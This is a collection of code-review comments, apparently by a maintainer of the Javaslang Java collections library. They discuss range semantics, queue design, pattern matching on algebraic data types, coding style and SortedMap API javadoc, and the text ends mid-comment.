implementing the RedBlackTree...\n. Ok. We hide the constructors by making them private or package private (if needed).\n. Doesn't break this semantics? E.g. for range(.0d, Double.MAX_VALUE, Double.MIN_VALUE). The steps will be greater and greater... But we expect constant steps.\nHow does Scala behave here?\n. Copied from TreeSet:\n``` java\n    @Override\n    public  TreeSet flatMap(Comparator<? super U> comparator,\n                                  Function<? super T, ? extends Iterable<? extends U>> mapper) {\n        Objects.requireNonNull(mapper, \"mapper is null\");\n        return TreeSet.ofAll(comparator, iterator().flatMap(mapper));\n    }\n@Override\npublic <U> TreeSet<U> flatMap(Function<? super T, ? extends Iterable<? extends U>> mapper) {\n    return flatMap(naturalComparator(), mapper);\n}\n\n```\n. Java's IntStream has range and rangeClosed, Java's DoubleStream does not have them. Maybe this is the reason.\nI have not a good answer but when in doubt we should always align to Scala. We have users that create issues if there is a different behavior than in Scala. So this is a good chance to align things.\n. We should create a new issue (for the range* stuff) because this change is important and more than a random change :)\n. I like that you shortened/simplified the range code. But I'm not sure about the changes regarding included and excluded INFINITY because of ULP. Also here I would take a look how Scala behaves.\n. Maybe, but it is a problem when using floating points. We need an appropriate solution. At $work team members implemented a calculation core for financial products and there were error cases because of the step problem.\n. When you predict the price of your assets for the next 30 years it is ok to have an error. Nobody knows the future :)\nWhen you calculate those prices for your whole portfolio, let's say for hundreds of thousands of trades, and you have to calculate scenarios and to shift values for hundreds of days back in time, then the calculation has to be really fast. We have 90 nodes in our calculation grid and the net time is 250 hours calculation when calculating the risk for example!\n. I've also seen such impls. But the calc cores I've seen so far use double. Some implemented in Java, some in C/C++.\n. thx for the link\n. You will receive my review this weekend. I had a hard working week and need time to dive into the code...\n. Thanks for your hard work on Javaslang! It brings the library forward.\n. Yay! :)\n. uh, oh :)\n. Does it crash javac, ECJ or the IntelliJ error marker?\nIf it crashes javac we have to find a workaround.\nIf it crashes the Eclise Compiler or IntelliJ error marker, we add bug-reports on the bug trackers.\n. Awesome!!\n. solved now by making size computation O(1), right?\n. Better use javaslang.collection.Collections.hash(this). We decided not to cache hash codes to save memory...\n. I would delete this method. rest.prepend(head) and concat(head, rest) are the same. This method does nothing. I question to introduce code in order to change naming. The less code the better.\n. Scala does not cache it. I question if hashCode is needed at all in multi-valued classes. How often did you use a PriorityQueue (or other collections that contain many elements) as key in a HashMap? We decided not to do that optimization for now.\n. Ok, let's stay with concat\n. > ... IF ...\nExactly that's my point. Every List/Stream/Queue... node would have a Lazy instance (including one Supplier + initially null value) and most probably it will never be used. I think that is the reason Scala also does not have it. We significantly reduced the HashMap in-memory size by removing all these Lazy instances.\nI don't want to talk to a Java guy and explain why our HashMap takes 200 MB space while Java's HashMap takes 30 MB knowing that the caches are never called...\n. Also memory is not cheap. GC gets more under pressure - which may have a performance impact.\n. > I'm not suggesting we SHOULD cache them, just awareness that both choices are bad :)\nYep, it is good that you question it. We will keep it in mind.\n. Here I would expect an Iterator<BigDecimal> as result.\n. could return rangeBy(fromDecimal, toDecimal, stepDecimal).map(BigDecimal::doubleValue)\n. instead of multiplying we could use movePointRight(1) - then this const can be removed\n. return result.movePointRight(1);\n. dito\n. yes, no sleep here. topics are too interesting :)\n. Mmhh, I've looked at the tests - don't see a reason why they might fail. Do you know which one of them fails?\n``` java\n    @Test\n    public void shouldCreateRangeClosedByWhereFromIsLessThanToAndStepCorrectDirection() {\n    // char\n    assertThat(rangeClosedBy('a', 'c', 1)).isEqualTo(of('a', 'b', 'c'));\n    assertThat(rangeClosedBy('a', 'e', 2)).isEqualTo(of('a', 'c', 'e'));\n    assertThat(rangeClosedBy('a', 'f', 2)).isEqualTo(of('a', 'c', 'e'));\n    assertThat(rangeClosedBy((char) (Character.MAX_VALUE - 2), Character.MAX_VALUE, 3)).isEqualTo(of((char) (Character.MAX_VALUE - 2)));\n    assertThat(rangeClosedBy((char) (Character.MAX_VALUE - 3), Character.MAX_VALUE, 3)).isEqualTo(of((char) (Character.MAX_VALUE - 3), Character.MAX_VALUE));\n    assertThat(rangeClosedBy('c', 'a', -1)).isEqualTo(of('c', 'b', 'a'));\n    assertThat(rangeClosedBy('e', 'a', -2)).isEqualTo(of('e', 'c', 'a'));\n    assertThat(rangeClosedBy('e', (char) ('a' - 1), -2)).isEqualTo(of('e', 'c', 'a'));\n    assertThat(rangeClosedBy((char) (Character.MIN_VALUE + 2), Character.MIN_VALUE, -3)).isEqualTo(of((char) (Character.MIN_VALUE + 2)));\n    assertThat(rangeClosedBy((char) (Character.MIN_VALUE + 3), Character.MIN_VALUE, -3)).isEqualTo(of((char) (Character.MIN_VALUE + 3), Character.MIN_VALUE));\n\n    // double\n    assertThat(rangeClosedBy(1.0, 3.0, 1.0)).isEqualTo(of(1.0, 2.0, 3.0));\n    assertThat(rangeClosedBy(1.0, 5.0, 2.0)).isEqualTo(of(1.0, 3.0, 5.0));\n    assertThat(rangeClosedBy(1.0, 6.0, 2.0)).isEqualTo(of(1.0, 3.0, 5.0));\n    assertThat(rangeClosedBy(Double.MAX_VALUE - 2.0E307, Double.MAX_VALUE, 3.0E307)).isEqualTo(of(Double.MAX_VALUE - 2.0E307));\n    assertThat(rangeClosedBy(3.0, 1.0, -1.0)).isEqualTo(of(3.0, 2.0, 1.0));\n    assertThat(rangeClosedBy(5.0, 1.0, -2.0)).isEqualTo(of(5.0, 3.0, 1.0));\n    assertThat(rangeClosedBy(5.0, 0.0, -2.0)).isEqualTo(of(5.0, 3.0, 1.0));\n    assertThat(rangeClosedBy(-Double.MAX_VALUE + 2.0E307, -Double.MAX_VALUE, -3.0E307)).isEqualTo(of(-Double.MAX_VALUE + 2.0E307));\n\n    // int\n    assertThat(rangeClosedBy(1, 3, 1)).isEqualTo(of(1, 2, 3));\n    assertThat(rangeClosedBy(1, 5, 2)).isEqualTo(of(1, 3, 5));\n    assertThat(rangeClosedBy(1, 6, 2)).isEqualTo(of(1, 3, 5));\n    assertThat(rangeClosedBy(Integer.MAX_VALUE - 2, Integer.MAX_VALUE, 3)).isEqualTo(of(Integer.MAX_VALUE - 2));\n    assertThat(rangeClosedBy(Integer.MAX_VALUE - 3, Integer.MAX_VALUE, 3)).isEqualTo(of(Integer.MAX_VALUE - 3, Integer.MAX_VALUE));\n    assertThat(rangeClosedBy(3, 1, -1)).isEqualTo(of(3, 2, 1));\n    assertThat(rangeClosedBy(5, 1, -2)).isEqualTo(of(5, 3, 1));\n    assertThat(rangeClosedBy(5, 0, -2)).isEqualTo(of(5, 3, 1));\n    assertThat(rangeClosedBy(Integer.MIN_VALUE + 2, Integer.MIN_VALUE, -3)).isEqualTo(of(Integer.MIN_VALUE + 2));\n    assertThat(rangeClosedBy(Integer.MIN_VALUE + 3, Integer.MIN_VALUE, -3)).isEqualTo(of(Integer.MIN_VALUE + 3, Integer.MIN_VALUE));\n\n    // long\n    assertThat(rangeClosedBy(1L, 3L, 1)).isEqualTo(of(1L, 2L, 3L));\n    assertThat(rangeClosedBy(1L, 5L, 2)).isEqualTo(of(1L, 3L, 5L));\n    assertThat(rangeClosedBy(1L, 6L, 2)).isEqualTo(of(1L, 3L, 5L));\n    assertThat(rangeClosedBy(Long.MAX_VALUE - 2, Long.MAX_VALUE, 3)).isEqualTo(of(Long.MAX_VALUE - 2));\n    assertThat(rangeClosedBy(Long.MAX_VALUE - 3, Long.MAX_VALUE, 3)).isEqualTo(of(Long.MAX_VALUE - 3, Long.MAX_VALUE));\n    assertThat(rangeClosedBy(3L, 1L, -1)).isEqualTo(of(3L, 2L, 1L));\n    assertThat(rangeClosedBy(5L, 1L, -2)).isEqualTo(of(5L, 3L, 1L));\n    assertThat(rangeClosedBy(5L, 0L, -2)).isEqualTo(of(5L, 3L, 1L));\n    assertThat(rangeClosedBy(Long.MIN_VALUE + 2, Long.MIN_VALUE, -3)).isEqualTo(of(Long.MIN_VALUE + 2));\n    assertThat(rangeClosedBy(Long.MIN_VALUE + 3, Long.MIN_VALUE, -3)).isEqualTo(of(Long.MIN_VALUE + 3, Long.MIN_VALUE));\n}\n\n``\n. It is hard to find the right infinityMultiplyer:BigDecimal.valueOf(1.0000000000000001110223024625...). Same for adding instead of multiplying:BigDecimal.valueOf(Math.nextDown(POSITIVE_INFINITY)).add(new BigDecimal(\"1.0793...E+292\"))`\n. Some tests trying to compute the minimal step towards positive infinity:\n``` java\n// = 1.9958403095347198E292\nMAX_VALUE - Math.nextDown(MAX_VALUE)\n// = 2E+292\nBigDecimal.valueOf(MAX_VALUE).subtract(BigDecimal.valueOf(Math.nextDown(MAX_VALUE)))\n``\n. Maybe the cleanest way is to extend BigDecimal with representations for positive and negative infinity (e.g. by having an infinity flag)?\n. Let's move the BigDecimal helper methods down into theIteratorModulelike this (we need to add some static imports forareEqualandasDecimal`). Please take a look at my TODO comment below.\n``` java\n    final class BigDecimalHelper {\n    private static final Lazy<BigDecimal> INFINITY_DISTANCE = Lazy.of(() -> {\n        final BigDecimal two = BigDecimal.valueOf(2);\n        final BigDecimal supremum = BigDecimal.valueOf(Math.nextDown(Double.POSITIVE_INFINITY));\n        BigDecimal lowerBound = supremum;\n        BigDecimal upperBound = two.pow(Double.MAX_EXPONENT + 1);\n        while (true) {\n            final BigDecimal magicValue = lowerBound.add(upperBound).divide(two, HALF_UP);\n            if (Double.isInfinite(magicValue.doubleValue())) {\n                // TODO: or is areEqual(magicValue, upperBound) more stable?\n                if (magicValue.equals(upperBound)) {\n                    return magicValue.subtract(supremum);\n                }\n                upperBound = magicValue;\n            } else {\n                lowerBound = magicValue;\n            }\n        }\n    });\n\n    /* scale-independent equality */\n    static boolean areEqual(BigDecimal from, BigDecimal toExclusive) {\n        return from.compareTo(toExclusive) == 0;\n    }\n\n    /* parse infinite values also */\n    static BigDecimal asDecimal(double number) {\n        if (number == NEGATIVE_INFINITY) {\n            final BigDecimal result = BigDecimal.valueOf(Math.nextUp(NEGATIVE_INFINITY));\n            return result.subtract(INFINITY_DISTANCE.get());\n        } else if (number == POSITIVE_INFINITY) {\n            final BigDecimal result = BigDecimal.valueOf(Math.nextDown(POSITIVE_INFINITY));\n            return result.add(INFINITY_DISTANCE.get());\n        } else {\n            return BigDecimal.valueOf(number);\n        }\n    }\n}\n\n```\nFor now we do not want to expose these helpers to other classes. Because Java has no module concept (yet), the auxiliary classes (*Module) ensure that they are only accessed from within a class file.\n. We should add a javadoc comment with you as @author and @since 2.1.0. See AbstractMap for example.\n. Please add the Javaslang file header to new files.\n. Good! Most committers forget to update this section :) Please sort it alphabetically like the other items.\n. Let's implement the Kind not in the abstract class. It is some sort of terminating resistor. They should be implemented by Queue and PriorityQueue. Also we should make these classes final because some methods overloaded from Traversable resp. LinearSeq are terminated by types, i.e. the methods are not overloadable by other classes any more.\n. I think we can implement it here. However, Queue.dequeue does perform an extra empty-check, PriorityQueue.dequeue does not. In general we do these extra checks in order\n1. to be independent of the methods that are called\n2. to provide more details error messages what did go wrong\nTherefore let's take the Queue method:\njava\n    @Override\n    public Tuple2<T, Q> dequeue() {\n        if (isEmpty()) {\n            throw new NoSuchElementException(\"dequeue of empty Queue\");\n        } else {\n            return Tuple.of(head(), tail());\n        }\n    }\nMaybe there are more Queue-specific methods that can be moved to this abstract class? Many methods of AbstractMap are also implementations of Traversable methods. We should move all duplicate methods from Queue and PriorityQueue to AbstractQueue.\n. Good point. Let's remove the empty instance and check for isEmpty. We do it like that in other classes that have a backend/delegate.\n. In this case we just use AbstractsQueue<T, Q>::enqueue. The TODO can be removed.\n. needs to be public\n. needs 2 b public\n. checking for type Iterable does not work. equals needs to be symmetric: if this is an AbstractQueue(1,2,3) and that is an Iterable(1,2,3) then the current impl says that this.equals(that) is true. But that.equals(this) is not true when that checks instanceof a specific type that is not an AbstractQueue.\nExample: AbstractMultimap.equals:\njava\n@Override\n    public boolean equals(Object o) {\n        if (o == this) {\n            return true;\n        } else if (o != null && getClass().isAssignableFrom(o.getClass())) {\n            final AbstractMultimap<?, ?, ?> that = (AbstractMultimap<?, ?, ?>) o;\n            return this.back.equals(that.back);\n        } else {\n            return false;\n        }\n    }\n. I think regarding PriorityQueues, the mutable (unsynchronized) form is unbeaten. If there is a scenario where the Queue is the bottleneck I would suggest to use the mutable one.\nI love your purely functional implementation and want to keep it. We should remove the delegate.\n. would be great to have also mutable and immutable as part of the test names.\n. @paplorinc yes, Ruslan is right. Let's remove this block. When Scala 2.12 is out we will update our dependencies.\nBtw - awesome work!! :-)\n. yep\n. We should not extend Traversable. If we need the method, it has to be duplicated (without inheritance).\nThere was a long discussion some time ago whether we should remove the Stack interface or not. We decided to keep it as rudimentary standalone interface. It is not a collection but a contract for Stack-like collections. List is currently the only implementation.\nScala removed the Stack interface entirely. But I think it is good to have the Stack methods as interface.\n. Generally I'm used to see !someVar or !someMethodCall and I would not have changed all occurreces of !isEmpty to isNotEmpty. ! is part of the Java language and it is used everywhere. We can't live without it.\nThis line is a good example. We still have !found. We could rename it notFound and invert the content but that seems too complicated. We had to rewrite well-known algorithms to fit the new notation. Also it is not possible to eliminate ! in algorithms that use both someVar and !someVar. So it is the best to accept !.\nFor the health of Javaslang it is better not to apply highly opinionated changes all over the code repository (a change may invent errors). It is like formatting. Some like 2 spaces indentation, some like 4 spaces or even tabs. Some prefer to use !someVar, some not.\nAdding the additional method to HashArrayMappedTrie (HAMT) makes not much sense. We add code to an internal class just for a flavor of readability.\n\nWith this change we should add the method isNotEmpty to Value in order to offer the users of the public API different ways to express themselves. But we should not change the whole code-base.\n. > e.g. by returning a Set instead\nChanging the return type to Set does not seem to be an option. subMap has to return a Map. For Set implementations we duplicated the key, this should be possible here without changing mem/cpu consumption.\n. This is a hard design decision. I understand you both. Nobody likes lists of boolean params, they are meaningless. However, Javaslang is still a Java library and devs are used to the existing NavigableMap API.\nAdding an enum Inclusion { INCLUSIVE, EXCLUSIVE } would solve the problem but increase the number of types. Where should it be placed? I should not be a top-level type. The main reason Javaslang looks relatively simple and compact is because helper classes/types are hidden as package-private top-level classes or public static nested classes. I think the reason why the Java language architects used boolean may also be the fact that there is no clean place to put such a type.\nIn order to keep it simple I would follow the Java interface, as @eduardmanas suggested.\n. Hi @paplorinc, the removed lines should work. These are the patterns that are generated at compile time:\n``` java\n// @Unapply static  Tuple2> List(List.Cons cons)\npublic static > Pattern2, _1, _2> List(Pattern<_1, ?> p1, Pattern<_2, ?> p2) {\n    return Pattern2.of(List.Cons.class, p1, p2, $::List);\n}\n// @Unapply static  Tuple0 List(List.Nil nil)\npublic static  Pattern0> List() {\n    return Pattern0.of(List.Nil.class);\n}\n```\nSome tests are in MatchTest.java. But I will add these (which work with lines deleted above):\n``` java\n@Test\npublic void shouldDecomposeEmptyList() {\n    final List list = List.empty();\n    final boolean isEmpty = Match(list).of(\n            Case(List($(), $()), (x, xs) -> false),\n            Case(List(), true)\n    );\n    assertThat(isEmpty).isTrue();\n}\n@Test\npublic void shouldDecomposeNonEmptyList() {\n    final List list = List.of(1);\n    final boolean isNotEmpty = Match(list).of(\n            Case(List($(), $()), (x, xs) -> true),\n            Case(List(), false)\n    );\n    assertThat(isNotEmpty).isTrue();\n}\n```\nCould you please explain your observation?\n. the cast does not work for big n.\nIt is confusing that we use both length() and length. We should use always length because is an accessible instance variable.\n. Wow - same result? Nice!\n. Nice finding, thx!!\n. You entirely deleted the method. Do we have a replacement for the test?\n. Maybe we should move this code to the insert method and add an if-else for the case that the index is 0. This could also boost the insert operation a little. What do you think?\n. ok, I just thought insert(0, ...) could also benefit - but I think that is a minor optimization and we are trading it for additional if's. It is ok as it is!\n. Ok, I think it is the best we can do. Segmenting using a two-dimensional array would be too much...\n. @paplorinc sorry for having ruined this PR! You are very fast with refactorings in the broad - it is hard for me to follow and spend enough time to think about changes. Keep up the awesome work! You already have made significant changes to Javaslang!\n. Decomposition, more specifically pattern matching, does only work for algebraic data types. Wikipedia has a good explanation (https://en.wikipedia.org/wiki/Algebraic_data_type), pattern matching is mentioned in the 4th paragraph.\nAn empty PriorityQueue has no head. Therefore we can't decompose it into a Tuple2(head, tail).\n. Ruslan added these tests to increase the code coverage towards 100%. They cover the internals of readObject and writeObject. We test that InvalidObjectException is thrown if the bytes representing the serialized object are broken. It is not-so-good that the test makes assumptions about implementation details, like the length of the list is stored at index 0 and so on...\n. We need them in order to decompose algebraic data types (ADTs) (see my previous comment).\nYour version does throw NoSuchElementException on empty List (see cons.head()):\njava\n@Unapply static <T> Tuple2<T, List<T>> List(List<T> cons) { return Tuple.of(cons.head(), cons.tail()); }\nOption is a good example for an ADT, it can be Some and None. List is another example for an ADT, it can be Cons and Nil. Because Stream is similar to List, it can be Cons and Empty, I decided to choose different names than in Scala. In Javaslang it is just List and Stream.\nScala:\nscala\nlist match {\n    case head :: tail => ...\n    case Nil => ...\n}\nJavaslang:\njava\nMatch(list).of(\n    Case(List($(), $()), (head, tail) => ...),\n    Case(List(), ...)\n);\nWe can't generalize the pattern matching framework to decompose arbitrary types into head/tail because we decide it by type  and not by isEmpty check.\n. @paplorinc Ohhh my gosh - I just saw that you made List a class O_O. You can't do such big changes in a PR named \"Added ... Benchmarks\". List is an algebraic data type, like Option (Some/None). We need to distinguish the states by type. It is essential for pattern matching. Also we follow best practices from the book \"Purely Functional Data Structures\". Scala and Haskell do the same for example.\nPlease revert the List changes and open a discussion/issue if you think there is potential to enhance the implementation.\n. Never mind, I was a little bit shocked because it was the first collection I implemented in Javaslang 1.0. There was already a discussion why it is an interface and not a class but it is intentionally designed that way. It should be sealed in order to prevent others to implement it but in Java it is not possible to express it.\n. The match pattern definitions (see $.java) have to return a Tuple. Therefore using isEmpty is not possible (the method returns either Tuple0 or Tuple2 but it cannot return both).\nProviding separate classes is the only possibility I see. Then my dream would come true and all collections could be interfaces with two nested classes NonEmpty and Empty. I like that idea. Those collections without an ordering/Comparator could have a singleton Empty class.\n(Having interfaces is nice because we are able to proxy them. I make use of that in Lazy.val for example. But the nested generic T in A<T> is nasty.)\n. We should separate benchmarks and optimizations into multiple PRs instead of multiple commits. Is that possible without too much effort?\n\n\nThough I expected something else than \"dude, you're not supposed to touch that, because that's how Haskell and Scala did it, so it's the way we should do it also - even if it might not be the best solution in Java\".\n\nSorry! I was not prepared for such a change in this PR - it was a shocking moment and I was emotional. Changing the List from an ADT to a plain class has so much implications for the whole code base that many of my design decisions would be thrown over board.\nThere are different types of changes to the code base of Javaslang:\n- reformatting - this shouldn't be done by committers in general (but solving inconsistencies is ok)\n- adding features - this is the 'normal' case for PRs\n- changing/optimizing implementations - also a 'normal' PR case\n- performing design changes - this should be discussed in depth because it may have deep implications.\nDesign changes are very dangerous. Even if they are right they most probably will break backward compatibility. We need to be careful here and slow down a bit.\n. If there is no special reason to use Function1 then please use Function instead. In general it is a good practice because it widens the applicability (Function1 is a Function).\n. dito\n. dito ... (and all other occurrences)\n. Maybe we can omit the ArrayList because this::ofAll is the same as empty().addAll(...):\njava\nreturn Collector.of(this::empty, BitSet::add, ?BitSet::addAll?, this::ofAll)\nFor other collections we have special concat operations that can be used instead of addAll I think. E.g. merge, union, etc. Can we do s.th. similar here for the combiner, too (see above)?\n. With #1295 we will change Iterator, it will not be Iterable any more, so we cannot use BitSet.ofAll(Iterator) in a future version. However, maybe we are able to add an additional BitSet.ofAll(Iterator) method then. I think currently it is not possible because of ambiguities, right!?\nWith #1332 we will still be able to convert an Iterator to an arbitrary type, especially BitSet. But @paplorinc also suggested to add the conversion method Value.toBitSet().\nCurrently I'm not clear how a conversion method toBitSet deals with the currently Builder (withXxx). Because of type erasure we are not aware of the component type T. I guess we have to provide the type via toBitSet(Class<T>).\n. I've seen the TODOs. We need to return Tuple3<BitSet<T1>, BitSet<T2>, BitSet<T3>>, same applies for other methods.\n. @paplorinc, @eduardmanas\n\nAsserts are for internal state validation (white box), while tests are for black box.\n\nI tend to remove assertions from our production code. I was tempted to do so when developing the RedBlackTree class. In the end I wrote property tests using the javaslang property test framework. The properties I tested checked the RB-Tree invariants, like no subsequent red nodes, max length of a path to ensure the tree is balanced after insert/delete, etc.\nThose tests disappeared when I refactored the Javaslang module structure because of cyclic dependencies. However, such tests could move to the javaslang-test module or to a separate module that contains property tests for the javaslang classes.\n. > Internal asserts are meant for redundancy checks, i.e. that the stored size is the same as the calculated one.\nI understand. That's ok.\n. +1 for keeping names consistent\n. (Mhh, we seem to use different formatters - we should unify them. I like the wildcards)\n. fixed javadoc\n. also different formatting rule!?\n. Yep, you're right. I'm not sure if TreeSet is the right type. Why not allow duplicates?\nMaybe we should return Tuple3<Traversable<T1>, Traversable<T2>, Traversable<T3>> because it is the most liberal solution. Under the hood we could use List. I expect a BitSet to contain not many elements in general...\n. An additional SerializableFunction would be too much. It is possible - please cast the method reference in the withXxx methods like this:\njava\nSAM s1 = (SAM & Serializable) Test::bar;\nThen we can use Function.\nExample (TreeSet):\njava\npublic static <T extends Comparable<? super T>> Collector<T, ArrayList<T>, TreeSet<T>> collector() {\n    return collector((Comparator<? super T> & Serializable) T::compareTo);\n}\n. ok, thx\n. Yep\n. Yes, you are right. I tested a bit using the Scala REPL. The Scala language architects decided for each Set impl to return a tuple of Sets. We should do the same. Because it breaks backward compatibility, I deferred the change to 3.0.0. See #1342.\n. @earlzero yes, that's right, we need the combiner, too. Could you please add it?\n. please use spaces instead of tabs\n. make all local vars final if possible\n. can be also final\n. dito\n. Please name it LeafNodeIterator\n. Why is a node not backed by a Tuple?, i.e. s.th. like nodes().map(AbstractNode::entry)\n. Wow, sophisticated Iterator :)\n. Morning :)\nYes, if it makes sense it should be a separate PR\n. I don't understand the comment.\n(Integer.SIZE / AbstractNode.SIZE + 1) + 1 not equals Integer.SIZE / AbstractNode.SIZE + 2\n. ok, then MAX_LEVELS is an upper bound, right?\n. why not set MAX_LEVELS to (Integer.SIZE / AbstractNode.SIZE + 1) + 1? \ud83d\udc35 \n. no, leave it as is\n. I think this is obsolete now. On the next merge it will disappear here.\n. This method is not used throughout the project and can be deleted.\n. return description missing\n. The re-arrangement of methods makes it very hard to see the real diff.\n. Woohooo! :-)))\n. Yay!\n. I'm really tempted to merge this PR :-)\n. Please move this file to the folder .travis/. There we collect all necessary CI build scripts.\n. Could be our mascot ;)\n. oh-oh - a code change in a benchmark PR ;-)\n. good!\n. I've not understood yet why we call a method length() when the instance variable length is in scope. Isn't it additional overhead to perform internal abstractions?\n. take(n) returns empty(), why tail() not anymore?\n. Please do the List changes in a separate PR. This PR should contain only benchmark changes.\n. Yes. I've to come up with an idea - it will take some time because I only have some hours in the evening.\n. I've compared the signature with Map.merge:\njava\n<U extends V> Map<K, V> merge(Map<? extends K, U> that,                  BiFunction<? super V, ? super U, ? extends V> collisionResolution);\n              M         putWith(Tuple2<? extends K, ? extends V> entry,  BiFunction<? super V, ? super V, ? extends V> merge);\nThey are very similar. We should adjust putWith like this:\njava\n<U extends V> M  putWith(Tuple2<? extends K, U> entry,  BiFunction<? super V, ? super U, ? extends V> merge);\nThat opens the type space of the second covariant argument of the merge function.\n/cc @ruslansennov right?\n. Yep, edit-error by me - will correct it in the example above.\n. One hint (I know it is nasty): Please use the final keyword on local vars if possible. That aligns the code style to the  Javaslang code base.\nOnce I decided to do it from the ground up while building Javaslang because Scala has var and val. One of the most evil enemies of ~~functional programming~~ robust programs is Mr. Mutation. Having final vars hardens our code.\nThe only thing I don't like about final is its verbosity. In an utopic Java language it should have been the default. But with JEP #286 comes the rescue (I pray every night for it). Then all of our local vars will be either var or val, of course most of them val.\nUpdate/interesting topic: Some people are sceptic regarding the use of final for local vars, given the counter-argument that a mutable object (e.g. having setters) will not turn immutable when we use the final keyword. That's right and the reason to use Javaslang (and immutable objects in general) ;-)\nBut using immutability (in Java) should not be confused to be the real and only way to do things. I do use mutability where it makes sense - mostly in a small, local scope. Sometimes are instance variables mutable (see Lazy and Future).\n. In the collections the methods are ordered as follows:\n1. static methods\n2. methods specific for that collection / additions\n3. overridden methods (all methods after // -- Adjusted return types of ... methods)\nI try to keep the methods alphabetically ordered. But I think that's not so important. Sometimes semantic order makes more sense.\nThe navigable map methods are specific to SortedMap, so lets move them upwards out of the 'Adjusted return types'  section, right before // -- Adjusted return types ..... Also let's add a preceding // -- Navigable Map comment:\n``` java\n    // -- Navigable Map\n/**\n * Returns a descending iterator that iterates elements in the reversed order induced by the key Comparator.\n *\n * @return\n */\nIterator<Tuple2<K, V>> descendingIterator();\n\n/**\n * Returns a reverse order {@link SortedSet} of the keys contained in this map.\n * <p>\n * The returned set has the ordering equivalent to {@link Comparator#reversed()} of the key's comparator.\n *\n * @return The keys in descending order.\n */\nSortedSet<K> descendingKeySet();\n\n/**\n * Returns a reverse order map with the contents of this map.\n * <p>\n * The returned set has the ordering equivalent to {@link Comparator#reversed()} of the key's comparator.\n *\n * @return a reverse order map of this map\n */\nSortedMap<K, V> descendingMap();\n\n/**\n * Returns a map with entries whose keys range from {@code fromKey} to {@code toKey}.\n * The {@code fromInclusive} and {@code toInclusive} flags control whether the lower and upper endpoints are\n * inclusive or exclusive.\n * <p>\n * If {@code fromKey} is {@link Option#none()}, then it assumes {@link SortedMap#min()} inclusive,\n * and the {@code fromInclusive} flag is ignored.\n * <p>\n * If {@code toKey} is {@link Option#none()}, then it assumes {@link SortedMap#max()} inclusive,\n * and the {@code toInclusive} flag is ignored.\n * <p>\n * If {@code fromKey} is equal to {@code toKey}, then an empty map is returned\n * unless both {@code fromInclusive} and {@code toInclusive} are {@code true}.\n *\n * @param fromKey       the low endpoint of the keys in the returned map.\n *                      If {@link Option#none()} then it assumes {@code fromKey} is {@link SortedMap#min()} inclusive\n *                      and ignores the {@code fromInclusive} flag.\n *                      If {@code fromKey} is lower than {@link SortedMap#min()}, then the low endpoint is {@link SortedMap#min()} inclusive.\n * @param fromInclusive {@code true} if the low endpoint is included, {@code false} if excluded\n * @param toKey         the high endpoint of the keys in the returned map.\n *                      If {@link Option#none()} then it assumes {@code toKey} is {@link SortedMap#max()} inclusive\n *                      and ignores the {@code toInclusive} flag\n *                      If {@code toKey} is lower than {@link SortedMap#max()}, then the high endpoint is {@link SortedMap#max()} inclusive.\n * @param toInclusive   {@code true} if the high endpoint is included, {@code false} if excluded\n * @return a map with entries with keys between {@code fromKey} to {@code toKey}\n * @throws IllegalArgumentException If {@code fromKey} value is greater than {@code toKey} value\n */\nSortedMap<K, V> subMap(Option<K> fromKey, boolean fromInclusive, Option<K> toKey, boolean toInclusive);\n\n/**\n * Returns a map with entries whose keys range from {@code fromKey} to {@code toKey}.\n * The {@code fromInclusive} and {@code toInclusive} flags control whether the lower and upper endpoints are\n * inclusive or exclusive.\n * <p>\n * If {@code fromKey} is equal to {@code toKey}, then an empty map is returned\n * unless both {@code fromInclusive} and {@code toInclusive} are {@code true}.\n *\n * @param fromKey       the low endpoint of the keys in the returned map.\n *                      If {@code fromKey} is lower than {@link SortedMap#min()}, then the low endpoint is {@link SortedMap#min()} inclusive.\n * @param fromInclusive {@code true} if the low endpoint is included, {@code false} if excluded\n * @param toKey         the high endpoint of the keys in the returned map.\n *                      If {@code toKey} is lower than {@link SortedMap#max()}, then the high endpoint is {@link SortedMap#max()} inclusive.\n * @param toInclusive   {@code true} if the high endpoint is included, {@code false} if excluded\n * @return a map with entries with keys between {@code fromKey} to {@code toKey}\n * @throws IllegalArgumentException If {@code fromKey} value is greater than {@code toKey} value\n */\nSortedMap<K, V> subMap(K fromKey, boolean fromInclusive, K toKey, boolean toInclusive);\n\n/**\n * Returns a map with entries whose keys range from {@code fromKey} inclusive to {@code toKey} exclusive.\n * <p>\n * If {@code fromKey} is equal to {@code toKey}, then it returns an empty map.\n *\n * @param fromKey       the low endpoint of the keys in the returned map.\n *                      If {@code fromKey} is lower than {@link SortedMap#min()}, then the low endpoint is {@link SortedMap#min()} inclusive.\n * @param toKey         the high endpoint of the keys in the returned map.\n *                      If {@code toKey} is lower than {@link SortedMap#max()}, then the high endpoint is {@link SortedMap#max()} inclusive.\n * @return a map with entries with keys between {@code fromKey} to {@code toKey}\n * @throws IllegalArgumentException If {@code fromKey} value is greater than {@code toKey} value\n */\nSortedMap<K, V> subMap(K fromKey, K toKey);\n\n/**\n * Returns a map whose keys are less than or equal to the given {@code toKey} if {@code inclusive} is {@code true},\n * or excluding the {@code toKey} if {@code inclusive} is {@code false}.\n *\n * @param toKey         the high endpoint of the keys in the returned map.\n * @param inclusive     {@code true} if the high endpoint is included, {@code false} if excluded\n * @return a map with entries with keys less than or equal to the given {@code toKey}\n */\nSortedMap<K, V> headMap(K toKey, boolean inclusive);\n\n/**\n * Returns a map whose keys are strictly less than the given {@code toKey}.\n *\n * @param toKey         the high endpoint (exclusive) of the keys in the returned map.\n * @return a map with entries with keys less than or equal to the given {@code toKey}\n */\nSortedMap<K, V> headMap(K toKey);\n\n/**\n * Returns a map whose keys are greater than or equal to the given {@code fromKey} if {@code inclusive} is {@code true},\n * or excluding the {@code fromKey} if {@code inclusive} is {@code false}.\n *\n * @param fromKey       the low endpoint of the keys in the returned map.\n *                      If {@code null} then all elements are returned.\n * @return a map with entries with keys greater than or equal to the given {@code fromKey}\n */\nSortedMap<K, V> tailMap(K fromKey, boolean inclusive);\n\n/**\n * Returns a map whose keys are greater than or equal to the given {@code fromKey} (inclusive)\n *\n * @param fromKey       the low endpoint (inclusive) of the keys in the returned map.\n *                      If {@code null} then all elements are returned.\n * @return a map with entries with keys greater than or equal to the given {@code fromKey}\n */\nSortedMap<K, V> tailMap(K fromKey);\n\n/**\n * Returns the element with the highest key lower than or equal to the given {@code key}, or {@link Option#none()} if not found.\n *\n * @param key the key\n * @return the floor entry for the {@code key}, or {@link Option#none()} if not found\n */\nOption<Tuple2<K, V>> floor(K key);\n\n/**\n * Returns the highest key lower than or equal to the given {@code key}, or {@link Option#none()} if not found.\n *\n * @param key the key\n * @return the floor for the {@code key}, or {@link 